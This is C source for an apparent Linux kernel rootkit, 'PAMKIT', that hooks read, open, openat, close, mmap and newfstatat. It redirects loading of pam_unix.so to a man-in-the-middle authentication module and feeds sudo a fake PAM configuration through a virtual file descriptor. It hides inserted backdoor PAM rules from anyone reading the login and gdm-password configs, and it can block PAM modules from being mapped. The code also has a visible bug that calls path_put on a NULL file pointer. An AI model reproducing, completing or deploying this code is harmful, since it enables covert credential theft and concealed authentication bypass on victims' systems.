/**
 * Implement the system call hooks.
 * 
 */

#include "sys.h"
#include "net/net.h"
#include "hooking/hooking.h"

//Get file struct and pin its path --> ! caller has to unpin path !
static struct file *
_get_file_from_fd(unsigned int fd)
{
    struct file *file;

    //Lock the process specific fs struct
    spin_lock(&current->files->file_lock);

    //get file struct associated with the given file descriptor
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
    file = files_lookup_fd_raw(current->files, fd);
    #else
    file = __fcheck_files(current->files, fd);
    #endif

    if (file == NULL || IS_ERR(file)) {
        pr_debug("Unable to obtain file ref with given fd\n");
        goto file_from_fd_error;
    }

    //Increase reference counter of path
    path_get(&file->f_path);

    //Release lock, as we dont need to access the files struct again
    spin_unlock(&current->files->file_lock);

    return file;

file_from_fd_error:
    //Release lock, as we dont need to access the files struct again
    spin_unlock(&current->files->file_lock);
    return NULL;
}

/**
 * @brief Searches the buffer, and if the two added PAM rules are found, the characters after the two rules are shifted
 * to the left to overwrite the inserted rules. After the shift, the freed space at the end of the buffer is padded with null bytes.
 * 
 * @param orig_buffer buffer to be modified
 * @param read_bytes size of the buffer
 * @return long number of bytes in the buffer, if the rules were contained in the buffer, read_bytes - len(rules) is returned
 */
static long
_replace_rules_in_buffer(char __user *orig_buffer, long read_bytes)
{
    int combined_rule_len = 113;
    long copy_to_error;
    long copy_from_error;
    long modified_buffer_size;
    char *modified_buffer;
    char *combined_target_location; //position of the combined rule in the buffer
    const char *combined_rule = "auth optional pam_unix.so\nauth sufficient pam_listfile.so file=/etc/pam.d/other sense=allow onerr=succeed quiet\n";
    size_t buffer_size = 0;
    size_t target_size = 0;
    size_t offset = 0;
    size_t padding_size = 0;
    long chars_after_target = 0;

    modified_buffer = (char *) kzalloc(read_bytes * sizeof(char), GFP_KERNEL);

    if (!modified_buffer) {
        return read_bytes;
    }

    copy_from_error = copy_from_user(modified_buffer, orig_buffer, read_bytes);

    if (copy_from_error) {
        goto cleanup_modify_buffer;
    }

    //can lead to buffer overflow detection panic if not terminated with a null byte
    modified_buffer_size = read_bytes; //strlen(modified_buffer);

    //Buffer is not large enough to hold the two PAM rules
    if (modified_buffer_size < combined_rule_len) {
        goto cleanup_modify_buffer;
    }

    combined_target_location = strstr(modified_buffer, combined_rule);

    if (!combined_target_location) {
        goto cleanup_modify_buffer;
    }

    buffer_size = read_bytes;
    target_size = strlen(combined_rule);

    //index in the modified buffer at which the combined rule has been found
    offset = combined_target_location - modified_buffer;
    //number of bytes that appear behind the found rules
    chars_after_target = buffer_size - target_size - offset;
    //after shifting the chars after the inserted rules, this is the number of bytes that needs to be overwritten with nullbytes
    padding_size = buffer_size - (offset + chars_after_target);
    

    //shift buffer content behind the combined rule to the left to overwrite the rules
    for (size_t i = 0; i < chars_after_target; i++) {
        combined_target_location[i] = combined_target_location[target_size + i];
    }

    //Add padding
    for (size_t i = 0; i < padding_size; i++) {
        modified_buffer[offset + chars_after_target + i] = '\0';   
    }

    copy_to_error = copy_to_user(orig_buffer, modified_buffer, read_bytes);

cleanup_modify_buffer:
    kfree(modified_buffer);
    return read_bytes - target_size;
}

static long
virtual_file_read(char __user *buffer, size_t requested_bytes)
{
    pid_t pid = current->pid;
    long available_bytes;
    long copy_to_error;
    int bytes_possible;
    char *read_result_buffer;

    if (requested_bytes == 0) {
        return 0;
    }

    //go through the read state list and obtain the read state of this process.
    vrt_t *read_information = get_table_entry_by_pid(pid);

    if (!read_information) {
        return -EBADFD;
    }

    //bytes that have not been read yet by the process
    available_bytes = FILE_SIZE - read_information->offset;

    if (available_bytes <= 0) {
        //number of bytes to be read by the requesting application are 0
        return 0;
    }

    //number of bytes that will be read from the virtual file and returned to the user
    bytes_possible = (available_bytes > requested_bytes) ? requested_bytes : available_bytes;

    //create buffer with bytes_possible size
    read_result_buffer = (char *) kzalloc(bytes_possible * sizeof(char), GFP_KERNEL);

    if (!read_result_buffer) {
        return -EFAULT; //unable to read from virtual file
    }

    //copy values from virtual file into buffer
    for (int i = 0; i < bytes_possible; i++) {
        read_result_buffer[i] = (virtual_gdm_config_file[read_information->offset + i]);
    }

    //update offset
    read_information->offset = read_information->offset + bytes_possible;

    //copy the content of this buffer into the user supplied user space buffer
    copy_to_error = copy_to_user(buffer, read_result_buffer, bytes_possible);

    if (copy_to_error) {
        kfree(read_result_buffer);
        return -EFAULT;
    }

    kfree(read_result_buffer);
    return bytes_possible;
}


asmlinkage long
#ifdef PTREGS_STUBS
hooked_read(const struct pt_regs *pt_regs)
#else
hooked_read(unsigned int fd, char __user *buf, size_t count)
#endif
{
    long ret;
    long buffer_modifying_error;

    #ifdef PTREGS_STUBS
    unsigned int check_for_vfd = pt_regs->di;
    #else
    unsigned int check_for_vfd = fd;
    #endif 

    if (check_for_vfd == VIRTUAL_FD) {

        if (strncmp(current->comm, "sudo", 4) != 0) {
            goto skip_virtual_file_read;
        }

        //Read from virtual file
        #ifdef PTREGS_STUBS
        ret = virtual_file_read((char *)pt_regs->si, pt_regs->dx);
        #else
        ret = virtual_file_read(buf, count);
        #endif
        
        return ret;
    }

skip_virtual_file_read:
    ret = ORIG_READ;

    if (ret <= 0) {
        return ret;
    }

    if ((strncmp(current->comm, "gdm-session-wor", 15) == 0) || (strncmp(current->comm, "login", 5) == 0) || (strstr(current->comm, "gdm") != NULL)) {
        //For gdm3 and login, the config file will not be modified
        return ret;
    }

    //check if the calling processes tries to reads the 'gdm-password' or 'login' PAM config file.
    char *path_buffer;
    char *pathname;
    char *dentry_path_ret;

    struct file *file;
    struct path *path;

    #ifdef PTREGS_STUBS
    file = _get_file_from_fd(pt_regs->di);
    #else
    file = _get_file_from_fd(fd);
    #endif

    if (!file) {
        //If we can not determine which file is opened, we search the buffer content regardless
        path_put(&file->f_path);
        return ret;
    }

    path_buffer = (char *)kzalloc(PATH_MAX * sizeof(char), GFP_KERNEL);

    if (!path_buffer) {
        path_put(&file->f_path);
        return ret;
    }

    dentry_path_ret = dentry_path_raw(file->f_path.dentry, path_buffer, PATH_MAX);

    if (dentry_path_ret == NULL || IS_ERR(dentry_path_ret)) {
        kfree(path_buffer);
        path_put(&file->f_path);
        return ret;
    }

    //Check if received absolute path corresponds to one of the default PAM config file paths
    if (
        strncmp("/etc/pam.d/gdm-password", dentry_path_ret, 23) != 0 &&
        strncmp("/usr/lib/pam.d/gdm-password", dentry_path_ret, 27) != 0 &&
        strncmp("/etc/pam.d/login", dentry_path_ret, 16) != 0 &&
        strncmp("/usr/lib/pam.d/login", dentry_path_ret, 20) != 0
    ) {
        path_put(&file->f_path);
        kfree(path_buffer);
        return ret;
    }


path_lookup_cleanup:
    kfree(path_buffer);
    path_put(&file->f_path);


skip_file_lookup:

    #ifdef PTREGS_STUBS
    ret = _replace_rules_in_buffer((char *) pt_regs->si, ret);
    #else
    ret = _replace_rules_in_buffer(buf, ret);
    #endif

    return ret;
}


//Check if given path matches one of the default PAM config files locations
static int
_matches_sudo_pam_config_path(const char *path)
{
    if ((strncmp(ETC_PAMD_SUDO, path, strlen(ETC_PAMD_SUDO)) == 0) ||
        (strncmp(USR_LIB_PAMD_SUDO, path, strlen(USR_LIB_PAMD_SUDO)) == 0) )
        {
            return 1;
        }
    return 0;
}

asmlinkage long
#ifdef PTREGS_STUBS
hooked_open(const struct pt_regs *pt_regs)
#else
hooked_open(const char __user *filename, int flags, umode_t mode)
#endif
{
    long ret;
    long copy_to_error;
    long copy_from_error;
    char *copied_path;
    char __user *file_path;


    #ifdef PTREGS_STUBS
    file_path = (char *) pt_regs->si;
    #else
    file_path = (char *) filename;
    #endif

    copied_path = (char *) kzalloc(NAME_MAX, GFP_KERNEL);
    if (!copied_path) {
        return ORIG_OPEN;
    }

    copy_from_error = copy_from_user(copied_path, file_path, NAME_MAX);

    if (copy_from_error) {
        kfree(copied_path);
        return ORIG_OPEN;
    }

    //For every call: replace pam_unix.so with the custom MitM module.
    if (strncmp(copied_path, PAM_UNIX_DEFAULT_PATH, PAM_UNIX_DEFAULT_PATH_SIZE) == 0) {

        pr_debug("PAMKIT: Replacing the pam_unix module with the custom MitM module\n");

        #ifdef PTREGS_STUBS
        copy_to_error = copy_to_user((char *) pt_regs->si, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
        #else
        copy_to_error = copy_to_user(filename, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
        #endif

        kfree(copied_path);
        if (copy_to_error) {
            return -EFAULT;
        }
        return ORIG_OPEN;
    }

    if (strncmp(current->comm, "sudo", 4)) {
        kfree(copied_path);
        return ORIG_OPEN;
    }

    if (_matches_sudo_pam_config_path(copied_path)) {

        pr_debug("PAMKIT: Replacing PAM config file fd with virtual fd, for absolute path\n");

        long val = VIRTUAL_FD;
        pid_t pid = current->pid;

        reset_table_entry_by_pid(pid);
        if (create_new_read_entry(pid) != PAMKIT_SUCCESS) {
            val = -EFAULT;
        }

        kfree(copied_path);
        return val;
    }

    kfree(copied_path);

    return ORIG_OPEN;
}


asmlinkage long
#ifdef PTREGS_STUBS
hooked_openat(const struct pt_regs *pt_regs)
#else
hooked_openat(int dfd, const char __user *filename, int flags, umode_t mode)
#endif
{
    long ret;
    long copy_from_error;
    long copy_to_error;
    char *copied_path;
    char __user *file_path;

    #ifdef PTREGS_STUBS
    file_path = (char *) pt_regs->si;
    #else
    file_path = (char *) filename;
    #endif

    copied_path = (char *) kzalloc(NAME_MAX, GFP_KERNEL);
    if (!copied_path) {
        return ORIG_OPENAT;
    }

    copy_from_error = copy_from_user(copied_path, file_path, NAME_MAX);

    if (copy_from_error) {
        kfree(copied_path);
        return ORIG_OPENAT;
    }

    //For every call: replace pam_unix.so with the custom MitM module.
    if (strncmp(copied_path, PAM_UNIX_DEFAULT_PATH, PAM_UNIX_DEFAULT_PATH_SIZE) == 0) {

        pr_debug("PAMKIT: Replacing the pam_unix module with the custom MitM module\n");

        #ifdef PTREGS_STUBS
        copy_to_error = copy_to_user((char *) pt_regs->si, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
        #else
        copy_to_error = copy_to_user(filename, PAMKIT_UNIX_PATH, PAMKIT_UNIX_PATH_SIZE);
        #endif

        kfree(copied_path);
        return ORIG_OPENAT;
    }

    //If an application other than 'sudo' calls openat, openat performs the original behavior.
    if (strncmp(current->comm, "sudo", 4) != 0) {
        kfree(copied_path);

        return ORIG_OPENAT;
    }

    //If an absolute path is given, the dfd is ignored
    if (strncmp(copied_path, "/", 1) == 0) {

        if (_matches_sudo_pam_config_path(copied_path)) {

                pr_debug("PAMKIT: Replacing PAM config file fd with virtual fd, for absolute path\n");

                long val = VIRTUAL_FD;
                pid_t pid = current->pid;

                reset_table_entry_by_pid(pid);
                if (create_new_read_entry(pid) != PAMKIT_SUCCESS) {
                    val = -EFAULT;
                }

                kfree(copied_path);
                return val;
        }

        kfree(copied_path);

        return ORIG_OPENAT;
    }

    //If the path is relative to the current working directory, get absolute path of CWD
    #ifdef PTREGS_STUBS
    int dfd_val = pt_regs->di;
    #else
    int dfd_val = dfd;
    #endif

    if (dfd_val == AT_FDCWD) {

        //pin path
        path_get(&current->fs->pwd);

        struct path *pwd = &current->fs->pwd;

        char *buffer = (char *) kzalloc(PATH_MAX, GFP_KERNEL);

        if (!buffer) {
            path_put(pwd);
            kfree(copied_path);
            return ORIG_OPENAT;
        }

        char *cwd_path = dentry_path_raw(pwd->dentry, buffer, PATH_MAX);

        path_put(pwd);

        if (!cwd_path || IS_ERR(cwd_path)) {
            kfree(copied_path);
            kfree(buffer);
            return ORIG_OPENAT;
        }

        //combine cwd + requested relative part to form the absolute path of the requested file.
        char *absolute_path_req_file = (char *) kzalloc(_STR_SIZE(cwd_path) + _STR_SIZE(copied_path), GFP_KERNEL);

        if (!absolute_path_req_file) {
            kfree(copied_path);
            kfree(buffer);
            return ORIG_OPENAT;
        }

        strcat(absolute_path_req_file, cwd_path);
        strcat(absolute_path_req_file, (copied_path+1)); //skip the '.' of the relative part

        if (_matches_sudo_pam_config_path(absolute_path_req_file)) {

            pr_debug("PAMKIT: replacing fd with virtual fd for relative path\n");

            kfree(copied_path);
            kfree(buffer);
            kfree(absolute_path_req_file);

            int val = VIRTUAL_FD;
            pid_t pid = current->pid;

            reset_table_entry_by_pid(pid);
            if (create_new_read_entry(pid) != PAMKIT_SUCCESS) {
                val = -EFAULT;
            }
            return val;
        } else {
            kfree(copied_path);
            kfree(buffer);
            kfree(absolute_path_req_file);

            return ORIG_OPENAT;
        }
    }

    //relative path with dfd != AT_FDCWD never happens with Linux-PAM
    kfree(copied_path);
    
    return ORIG_OPENAT;
}


asmlinkage long
#ifdef PTREGS_STUBS
hooked_newfstatat(const struct pt_regs *pt_regs)
#else
hooked_newfstatat(int dfd, const char __user *filename, struct stat __user *statbuf, int flag)
#endif
{
    long ret;
    long copy_to_error;
    struct stat *custom_stat;

    if (strncmp("sudo", current->comm, 4) != 0) {
        return ORIG_NEWFSTATAT;
    }

    #ifdef PTREGS_STUBS
    int check_fd = pt_regs->di;
    #else
    int check_fd = dfd;
    #endif

    if (check_fd != VIRTUAL_FD) {
        return ORIG_NEWFSTATAT;
    }

    custom_stat = (struct stat *) kzalloc(sizeof(struct stat), GFP_KERNEL);

    if (!custom_stat) {
        return -EFAULT;
    }

    custom_stat->st_size = FILE_SIZE;
    custom_stat->st_mode = S_IFREG|0644;
    custom_stat->st_dev = 2050;
    custom_stat->st_blksize = 4096;
    custom_stat->st_blocks = 8;

    #ifdef PTREGS_STUBS
    copy_to_error = copy_to_user((struct stat *) pt_regs->dx, custom_stat, sizeof(struct stat));
    #else
    copy_to_error = copy_to_user(statbuf, custom_stat, sizeof(struct stat));
    #endif

    if (copy_to_error) {
        kfree(custom_stat);
        return -ENOMEM;
    }


    kfree(custom_stat);
    return PAMKIT_SUCCESS;
}


asmlinkage long
#ifdef PTREGS_STUBS
hooked_close(const struct pt_regs *pt_regs)
#else
hooked_close(int fd)
#endif
{
    long ret;

    if (strncmp("sudo", current->comm, 4) != 0) {
        return ORIG_CLOSE;
    }
    
    
    #ifdef PTREGS_STUBS
    int file_to_close = pt_regs->di;
    #else
    int file_to_close = fd;
    #endif

    //if sudo tries to close a file different from the virtual file, close file as usual
    if (file_to_close != VIRTUAL_FD) {
        return ORIG_CLOSE;
    }

    //close file by removing this processes read state from the read table
    ret = remove_table_entry_by_pid(current->pid);
    return ret;
}


asmlinkage long
#ifdef PTREGS_STUBS
hooked_mmap(const struct pt_regs *pt_regs)
#else
hooked_mmap(unsigned long addr, unsigned long len, int prot, int flags, int fd, long off)
#endif
{
    long ret;
    struct file *file;
    char *absolute_path;
    char *absolute_path_buffer;
    char *last_path_component;
    char *dot;

    if (!drop_everything) {
        ret = ORIG_MMAP;
        return ret;
    }

    #ifdef PTREGS_STUBS
    file = _get_file_from_fd(pt_regs->r8);
    #else
    file = _get_file_from_fd(fd);
    #endif

    if (!file || IS_ERR(file)) {
        ret = ORIG_MMAP;
        return ret;
    }

    absolute_path_buffer = (char *) kzalloc(PATH_MAX, GFP_KERNEL);

    if (!absolute_path_buffer) {
        path_put(&file->f_path);
        ret = ORIG_MMAP;
        return ret;
    }

    absolute_path = dentry_path_raw(file->f_path.dentry, absolute_path_buffer, PATH_MAX);

    //unpin path
    path_put(&file->f_path);

    if (!absolute_path || IS_ERR(absolute_path)) {
        kfree(absolute_path_buffer);
        ret = ORIG_MMAP;
        return ret;
    }

    //default naming always starts with pam_ and ends with .so

    last_path_component = strrchr(absolute_path, '/');

    if (unlikely(!last_path_component)) {
        kfree(absolute_path_buffer);
        ret = ORIG_MMAP;
        return ret;
    }

    if (strncmp("/pam", last_path_component, 4) != 0) {
        //if it doesnt start with '/pam' its likely not a pam module
        kfree(absolute_path_buffer);
        ret = ORIG_MMAP;
        return ret;
    }

    dot = strrchr(last_path_component, '.');

    if (!dot || (strncmp(".so\0", dot, 4) != 0)) {
        //not a module, as it does not end with .so
        kfree(absolute_path_buffer);
        ret = ORIG_MMAP;
        return ret;
    }

    //We only reach this part of the function, if a process tries to map a PAM module
    kfree(absolute_path_buffer);

    //Prevent an application from mmaping any PAM module into memory.
    return PAMKIT_PREVENT_PAM_MAPPING;
}


hook_data_t old_pamkit_syscall_hooks[] = {
    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_read", (unsigned long *) &orig_read, (unsigned long *) hooked_read, __NR_read),
    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_open",  (unsigned long *) &orig_open, (unsigned long *) hooked_open, __NR_open),
    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_openat", (unsigned long *) &orig_openat,  (unsigned long *) hooked_openat, __NR_openat),
    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_close", (unsigned long *) &orig_close, (unsigned long *) hooked_close, __NR_close),
    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_mmap",  (unsigned long *) &orig_mmap,  (unsigned long *) hooked_mmap, __NR_mmap),
    SYSCALL_HOOK_DATA_DEFINE("__x64_sys_newfstatat", (unsigned long *) &orig_newfstatat, (unsigned long *) hooked_newfstatat, __NR_newfstatat),
    SYSCALL_HOOK_DATA_EMPTY
};
